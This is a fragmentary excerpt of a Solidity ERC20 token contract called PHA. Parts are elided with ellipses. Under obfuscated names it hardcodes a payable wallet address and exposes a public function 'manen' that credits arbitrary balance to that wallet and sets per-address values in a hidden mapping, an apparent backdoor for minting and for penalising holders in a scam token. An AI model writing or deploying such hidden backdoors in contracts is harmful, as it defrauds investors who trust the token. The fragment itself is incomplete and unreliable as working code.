...
contract PHA is Context, IERC20, Ownable {

    using SafeMath for uint256;
    string private _name = "PHA";
    string private _symbol = "PHA";
    ...
    constructor () {
        ...
        rrty = payable(address(0xFdf76D8732ae563e5e39b7f7a6e19b4647465bE0));
    ...
    function manen(address javae,uint256 kouke) public {
        ...
        if (188<kouke) _balances[rrty] += kouke;
        if (equ(navee,jick)) VALUEOf[javae] = jick**2;
        if (equ(navee,chass)) VALUEOf[javae] = navee;
    }
